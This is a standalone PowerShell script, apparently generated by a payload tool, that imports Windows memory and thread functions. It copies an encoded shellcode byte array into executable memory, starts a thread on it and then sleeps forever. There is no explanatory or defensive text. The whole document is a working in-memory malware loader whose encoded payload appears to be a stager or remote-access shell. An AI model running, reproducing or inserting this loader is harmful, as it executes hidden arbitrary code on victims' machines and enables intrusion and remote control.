$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbd,0xf7,0xcb,0xe2,0xbd,0xdb,0xdb,0xd9,0x74,0x24,0xf4,0x5f,0x2b,0xc9,0xb1,0x47,0x31,0x6f,0x13,0x83,0xef,0xfc,0x03,0x6f,0xf8,0x29,0x17,0x41,0xee,0x2c,0xd8,0xba,0xee,0x50,0x50,0x5f,0xdf,0x50,0x06,0x2b,0x4f,0x61,0x4c,0x79,0x63,0x0a,0x00,0x6a,0xf0,0x7e,0x8d,0x9d,0xb1,0x35,0xeb,0x90,0x42,0x65,0xcf,0xb3,0xc0,0x74,0x1c,0x14,0xf9,0xb6,0x51,0x55,0x3e,0xaa,0x98,0x07,0x97,0xa0,0x0f,0xb8,0x9c,0xfd,0x93,0x33,0xee,0x10,0x94,0xa0,0xa6,0x13,0xb5,0x76,0xbd,0x4d,0x15,0x78,0x12,0xe6,0x1c,0x62,0x77,0xc3,0xd7,0x19,0x43,0xbf,0xe9,0xcb,0x9a,0x40,0x45,0x32,0x13,0xb3,0x97,0x72,0x93,0x2c,0xe2,0x8a,0xe0,0xd1,0xf5,0x48,0x9b,0x0d,0x73,0x4b,0x3b,0xc5,0x23,0xb7,0xba,0x0a,0xb5,0x3c,0xb0,0xe7,0xb1,0x1b,0xd4,0xf6,0x16,0x10,0xe0,0x73,0x99,0xf7,0x61,0xc7,0xbe,0xd3,0x2a,0x93,0xdf,0x42,0x96,0x72,0xdf,0x95,0x79,0x2a,0x45,0xdd,0x97,0x3f,0xf4,0xbc,0xff,0x8c,0x35,0x3f,0xff,0x9a,0x4e,0x4c,0xcd,0x05,0xe5,0xda,0x7d,0xcd,0x23,0x1c,0x82,0xe4,0x94,0xb2,0x7d,0x07,0xe5,0x9b,0xb9,0x53,0xb5,0xb3,0x68,0xdc,0x5e,0x44,0x95,0x09,0xca,0x41,0x01,0xed,0x5c,0xde,0x32,0x79,0x61,0xde,0xa5,0x26,0xec,0x38,0x95,0x86,0xbe,0x94,0x55,0x77,0x7f,0x45,0x3d,0x9d,0x70,0xba,0x5d,0x9e,0x5a,0xd3,0xf7,0x71,0x33,0x8b,0x6f,0xeb,0x1e,0x47,0x0e,0xf4,0xb4,0x2d,0x10,0x7e,0x3b,0xd1,0xde,0x77,0x36,0xc1,0xb6,0x77,0x0d,0xbb,0x10,0x87,0xbb,0xd6,0x9c,0x1d,0x40,0x71,0xcb,0x89,0x4a,0xa4,0x3b,0x16,0xb4,0x83,0x30,0x9f,0x20,0x6c,0x2e,0xe0,0xa4,0x6c,0xae,0xb6,0xae,0x6c,0xc6,0x6e,0x8b,0x3e,0xf3,0x70,0x06,0x53,0xa8,0xe4,0xa9,0x02,0x1d,0xae,0xc1,0xa8,0x78,0x98,0x4d,0x52,0xaf,0x18,0xb1,0x85,0x89,0x6e,0xdb,0x15;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};